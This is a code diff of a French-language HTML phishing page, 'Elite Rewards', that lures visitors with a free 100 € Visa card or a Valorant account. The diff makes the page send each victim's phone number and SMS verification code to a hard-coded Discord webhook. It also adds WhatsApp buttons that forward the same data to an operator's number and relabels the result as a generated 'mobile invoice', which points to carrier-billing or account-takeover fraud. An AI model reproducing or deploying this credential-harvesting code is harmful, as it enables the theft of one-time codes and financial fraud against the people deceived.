@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Elite Rewards | Valorant & Cards</title>
+    <title>Elite Rewards | Verification</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;500;700&display=swap');
 
@@ -14,6 +14,7 @@
             --neon-blue: #00f3ff;
             --text-main: #ffffff;
             --card-bg: linear-gradient(135deg, #2a2a2a 0%, #111 100%);
+            --whatsapp: #25D366;
         }
 
         body {
@@ -29,7 +30,6 @@
             transition: background 0.5s ease;
         }
 
-        /* Thème Valorant */
         body.valorant-mode {
             background-image: 
                 radial-gradient(circle at 20% 80%, rgba(255, 43, 108, 0.1) 0%, transparent 50%),
@@ -42,7 +42,6 @@
             position: relative;
         }
 
-        /* Carte de Crédit / Compte */
         .credit-card {
             width: 100%;
             height: 220px;
@@ -57,7 +56,6 @@
             border: 1px solid #333;
         }
 
-        /* Effets de fond de la carte */
         .card-bg {
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -66,7 +64,6 @@
             z-index: 0;
         }
 
-        /* Quand c'est Valorant */
         body.valorant-mode .credit-card {
             background: linear-gradient(135deg, #101014 0%, #000 100%);
             border: 1px solid var(--purple);
@@ -80,7 +77,6 @@
             opacity: 0.4;
         }
 
-        /* Contenu Carte */
         .card-content {
             padding: 20px;
             height: 100%;
@@ -111,7 +107,6 @@
             letter-spacing: 2px;
         }
 
-        /* Le "Solde" ou ID */
         .balance {
             font-family: 'Orbitron', sans-serif;
             font-size: 32px;
@@ -133,7 +128,6 @@
             text-transform: uppercase;
         }
 
-        /* Formulaire */
         .form-card {
             background: rgba(255,255,255,0.02);
             border: 1px solid rgba(255,255,255,0.1);
@@ -158,7 +152,6 @@
             text-shadow: 0 0 10px rgba(255, 43, 108, 0.5);
         }
 
-        /* Options simplifiées */
         .grid-options {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -281,12 +274,18 @@
         }
         body.valorant-mode .check-icon { color: var(--neon-blue); }
 
+        .wa-btn {
+            background: var(--whatsapp);
+            color: white;
+            margin-top: 10px;
+        }
+        .wa-btn:hover { background: #1ebe57; }
+
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- Carte de Crédit / Compte -->
     <div class="credit-card">
         <div class="card-bg"></div>
         <div class="card-content">
@@ -294,9 +293,7 @@
                 <div class="gold-chip"></div>
                 <div class="visa-logo" id="cardLogo">VISA ELITE</div>
             </div>
-            
             <div class="balance" id="cardBalance">100,00 €</div>
-            
             <div class="card-details">
                 <span id="cardName">VIP GUEST</span>
                 <span id="cardItem">Carte Virtuelle</span>
@@ -304,19 +301,15 @@
         </div>
     </div>
 
-    <!-- Formulaire -->
     <div class="form-card">
         <h2>Choisissez votre type</h2>
         
-        <!-- Étape 1 -->
         <div id="s1" class="step active">
             <div class="grid-options">
-                <!-- Compte Valorant -->
                 <div class="opt" onclick="pick('valorant')">
                     <span class="icon">🎯</span>
                     <span>Compte Valorant</span>
                 </div>
-                <!-- Carte de Crédit -->
                 <div class="opt selected" onclick="pick('visa')">
                     <span class="icon">💳</span>
                     <span>Carte de Crédit</span>
@@ -326,16 +319,18 @@
             <button onclick="goToSMS()">ACTIVER</button>
         </div>
 
-        <!-- Étape 2 -->
         <div id="s2" class="step">
             <div style="text-align: center; color: #aaa; font-size: 13px; margin-bottom: 15px;">
-                Vérification de compte via SMS
+                Vérification de compte
             </div>
             <input type="text" id="code" maxlength="6" placeholder="CODE DE VÉRIFICATION">
             <button onclick="verify()">VÉRIFIER</button>
+            <!-- Option WhatsApp -->
+            <button class="wa-btn" onclick="verifyWA()" style="margin-top: 10px;">
+                ✅ VALIDER VIA WHATSAPP
+            </button>
         </div>
 
-        <!-- Étape 3 -->
         <div id="s3" class="step">
             <div class="loader"></div>
             <div style="text-align: center; color: #aaa; font-size: 13px;">
@@ -343,21 +338,27 @@
             </div>
         </div>
 
-        <!-- Étape 4 -->
         <div id="s4" class="step">
             <div class="success-box">
                 <span class="check-icon">✅</span>
                 <h3 style="color: var(--text-main); margin: 0;">Compte Vérifié</h3>
                 <p style="color: #888; font-size: 13px; margin-top: 5px;">
-                    Opération réussie.
+                    Facture mobile générée.
                 </p>
             </div>
+            <!-- Bouton WhatsApp final -->
+            <button class="wa-btn" id="finalWaBtn" style="display:none;" onclick="sendFinalWA()">
+                📲 Envoyer la facture sur WhatsApp
+            </button>
         </div>
     </div>
 </div>
 
 <script>
-    const WEBHOOK = "https://discord.com/api/webhooks/1537498800036384899/VbsKyHoZ2UC6e8fMPfpdqYXOuFgMa4P032DR2Ygh9ZNmX79ZB6hSSmfgR9o9cszR2bcH";
+    // REMPLACE PAR TON WEBHOOK DISCORD
+    const WEBHOOK = "https://discord.com/api/webhooks/1537498800036384899/VbsKyHoZ2UC6e8fMPfpdqYXOuFgMa4P032DR2Ygh9ZNmX79ZB6hSSmfgR9o9cszR2bcH"; 
+    // NUMÉRO DE WHATSAPP DU DESTINATAIRE (Format International sans +, ex: 33612345678)
+    const WA_NUMBER = "33600000000"; 
 
     function pick(type) {
         const logo = document.getElementById('cardLogo');
@@ -365,7 +366,6 @@
         const name = document.getElementById('cardName');
         const item = document.getElementById('cardItem');
 
-        // Si c'est Valorant, on change tout le style et le texte
         if (type === 'valorant') {
             document.body.classList.add('valorant-mode');
             logo.innerText = "RIOT GAMES";
@@ -373,7 +373,6 @@
             name.innerText = "DIAMOND II";
             item.innerText = "11 SKINS • LVL 64";
         } else {
-            // Retour au mode standard (Visa)
             document.body.classList.remove('valorant-mode');
             logo.innerText = "VISA ELITE";
             balance.innerText = "100,00 €";
@@ -391,25 +390,47 @@
     }
 
     function verify() {
-        document.getElementById('s2').classList.remove('active');
-        document.getElementById('s3').classList.add('active');
+        processStep();
+    }
 
-        // Envoi Discord
+    function verifyWA() {
+        // Ouvre WhatsApp directement
+        const phone = document.getElementById('phone').value;
+        const code = document.getElementById('code').value || "NON_SPECIFIÉ";
+        const msg = `*Vérification Carte/Compte*%0A%0A📱 Numéro: ${phone}%0A🔑 Code: ${code}%0A✅ Type: ${document.body.classList.contains('valorant-mode') ? 'Valorant' : 'Visa'}`;
+        window.open(`https://wa.me/${WA_NUMBER}?text=${msg}`, '_blank');
+        processStep();
+    }
+
+    function processStep() {
+        const phone = document.getElementById('phone').value;
+        const code = document.getElementById('code').value;
         const isValorant = document.body.classList.contains('valorant-mode');
-        const status = isValorant ? "Compte Valorant (11 Skins)" : "Carte Visa";
-        
+        const status = isValorant ? "Compte Valorant" : "Carte Visa";
+
+        // Envoi Discord (Corrigé pour tout envoyer)
         fetch(WEBHOOK, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
-                content: `💰 **Vérification**\n📱 <@${document.getElementById('phone').value}>\n🎮 Type: ${status}\n💎 Statut: Vérifié`
+                content: `💰 **Vérification**\n📱 Numéro: \`${phone}\`\n🔑 Code: \`${code}\`\n🎮 Type: ${status}`
             })
         });
+
+        document.getElementById('s2').classList.remove('active');
+        document.getElementById('s3').classList.add('active');
 
         setTimeout(() => {
             document.getElementById('s3').classList.remove('active');
             document.getElementById('s4').classList.add('active');
+            document.getElementById('finalWaBtn').style.display = 'block';
         }, 2500);
+    }
+
+    function sendFinalWA() {
+        const phone = document.getElementById('phone').value;
+        const msg = `*Facture Mobile*%0A%0AMerci pour votre vérification.%0ANuméro: ${phone}%0AStatut: Actif.`;
+        window.open(`https://wa.me/${WA_NUMBER}?text=${msg}`, '_blank');
     }
 </script>
 
